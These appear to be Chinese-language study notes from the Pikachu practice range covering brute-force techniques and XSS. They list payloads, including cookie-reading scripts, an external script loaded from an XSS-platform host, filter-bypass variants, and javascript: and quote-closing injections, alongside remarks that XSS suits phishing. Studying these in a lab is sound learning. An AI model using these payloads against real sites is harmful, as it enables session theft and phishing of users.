其实一开始做总结我是拒绝的，因为刚刚打完靶场，感觉没什么可做的。但很不幸，人的记忆力有限，隔了一个月就把常见漏洞的原理及payload忘得差不多了。为了不忘掉这种基础，总结还是得做，也得多翻翻。

以下漏洞来源于Pikachu靶场



# 暴力破解

## 简介

突出一个无脑，强大的算力总能帮你弄出想要的。



## 1、基于表单

抓包重放改payload，脚本小子的最爱

**Burp各种攻击模式的区别**

1. **Sinper：**一个变量设置一个payload进行攻击
2. **Battering ram：**可以设置两个变量，把payload同时给两个变量
3. **Pitchfork：**两个变量分别设置payload，然后按顺序一一对应进行破解
4. **Cluster bomb：**两个变量分别设置payload，然后交叉列所有情况进行破解（常用）



## 2、验证码绕过（server端）

要填验证码

观察验证码刷新机制。靶场里边是输错不更新验证码，那就用一个验证码爆破就行。



## 3、验证码绕过（client端）

我直接在html里边改自己想要的验证码或者删掉，不会有人还这样写验证码吧？



## 4、token

在burpsuite里边设置就好，因为token每次都更新，那就让burpsuite每次都获得它更新的字符就行。



# 跨站脚本攻击（XSS）

## 简介

全称应该叫：Cross-Site Scripting，只是为了和CSS做区分才取了上边那个名字。

XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。
XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。（所以说我们可以用来钓鱼）
形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。
因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:
 输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;
 输出转义：根据输出点的位置对输出到前端的内容进行适当转义;



## 1、反射型XSS

### get

Get 发包。改参数就行。



这里复习一下GET和POST的区别：

GET 是user拿着数据A问server要数据B。发送时数据A在url里包含，有暴露风险。

POST 是user向server给数据A，server收到数据A后再判断给不给数据B。发生数据时有body以及相应表单。

从原理上看似乎POST比GET安全很多，但事实上，两种方式在HTTP下都有相同程度的安全隐患，即劫持后包后内由于里边都是明文，信息直接裸奔。

而应用HTTPS会让这两种方式更安全，毕竟加入了TLS/SSL以及相应加密。



### post

同上，只不过是 POST发包



payload：<script>alert(1)</script>

payload：<script>alert(document.cookie)</script>

payload:<script src=http://xss.fbisb.com/ij7V></script>

有时会用到：<img src=a onerror="alert(1)"/>

两种方式由于脚本存不到服务器内，所以多用于钓鱼。

## 2、存储型XSS

存储型xss是保存在数据库里的，如果用户刷新，留言列表会从数据库提取出xss数据弹框，存的好会一直弹出来，越弹越多







## 3、DOM型XSS

### 普通DOM型

造成DOM型XSS的原因是前端的输入被DOM给获取到了，通过DOM又在前端输出，跟反射型和存储型比起来，它是不经过后台交互的

文档对象模型 (DOM) 是 HTML 和 XML 文档的编程接口。它提供了对文档的结构化的表述，并定义了一种方式可以使从程序中对该结构进行访问，从而改变文档的结构，样式和内容。DOM 将文档解析为一个由节点和对象（包含属性和方法的对象）组成的结构集合。简言之，它会将 web 页面和脚本或程序语言连接起来。

一个 web 页面是一个文档。这个文档可以在浏览器窗口或作为 HTML 源码显示出来。但上述两个情况中都是同一份文档。文档对象模型（DOM）提供了对同一份文档的另一种表现，存储和操作的方式。 DOM 是 web 页面的完全的面向对象表述，它能够使用如 JavaScript 等脚本语言进行修改。



成因：

var str = document.getElementById("text").value; 

document.getElementById("dom").innerHTML = "<a href='"+str+"'>what do you see?</a>";



payload:   #' onclick=alert(1)>

payload:  '><img src="#" onmouseover="alert(1)">

payload:   ' onclick="alert(1)">



### DOM型XSS-X

payload同上

跟前面的DOM不同的是，它的输入是从浏览器的URL中获取的，很像反射型XSS(get)。而前面的DOM是从Element中获取的



成因：

function domxss(){ var str = window.location.search; 

var txss = decodeURIComponent(str.split("text=")[1]); 

var xss = txss.replace(/\+/g,' ');

 document.getElementById("dom").innerHTML = "<a href='"+xss+"'>就让往事都随风,都随风吧</a>"; }




## 4、特殊

### XSS盲打

顾名思义，对后台弹窗，但是我们看不到反馈

用来钓鱼挺好的

也可以接DNSlog——>快去查！



### XSS过滤

**常见过滤绕过方法：**

- 前端限制绕过，直接抓包重放，或者修改html前端代码。比如反射型XSS(get)中限制输入20个字符。
- 大小写，例如`<SCRIPT>aLeRT(“jwt”)</sCRIpt>`。后台可能用正则表达式匹配，如果正则里面只匹配小写，那就可能被绕过。
- 双写，例如`<scri<script>pt>alert(“jwt”)</scri</script>pt>`。后台可能把`<script>`标签去掉，但可能只去掉一次。
- 注释干扰，例如`<scri<!--test-->pt>alert(“jwt”)</sc<!--test-->ript>`。加上注释后可能可以绕过后台过滤机制。
- 编码，后台过滤了特殊字符，比如`<script>`标签，但该标签可以被各种编码，后台不一定过滤





### XSS与htmlspecialchars

htmlspecialchars()是PHP里面**把预定义的字符转换为HTML实体的函数**，这个函数默认情况下是不会编码单引号的

预定义的字符是：

- & （和号）成为 &amp
- “ （双引号）成为 &quot
- ‘ （单引号）成为 &#039
- < （小于）成为 &lt
- \> （大于）成为 &lt

**构造Payload:**先使用单引号闭合a标签，然后再进行弹框。提交后需要点击超链接才会弹框

```html
#' onclick=alert(1) '
```

```html
#' onclick='alert(1399)
```

### XSS与href输出

使用了都`htmlspecialchars`函数，`><"'&`都被HTML实体化，且用户输入的在`href`标签里，可以使用javascript协议来执行js代码

构造Payload如下，没有上面被转义的字符

javascript:alert(1)



### XSS与JS输出

漏洞的输出点是在JS中，通过用户的输入动态生成JS代码

用一个单引号和`</script>`闭合掉页面中的`<script>`，然后再插入自己的JS代码





可以，但是没有必要